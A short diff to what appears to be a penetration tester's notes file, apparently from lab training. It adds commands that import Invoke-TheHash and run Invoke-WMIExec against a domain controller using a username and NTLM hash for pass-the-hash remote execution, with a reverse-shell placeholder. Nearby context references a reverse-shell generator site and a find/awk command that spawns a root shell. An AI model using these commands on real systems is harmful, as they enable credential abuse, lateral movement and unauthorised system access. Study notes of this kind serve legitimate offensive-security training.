@@ -64,6 +64,9 @@ playloads generate:
 
   https://www.revshells.com/
 
+    PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+    PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "REVSHELLS.COM"
+
 find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 
 
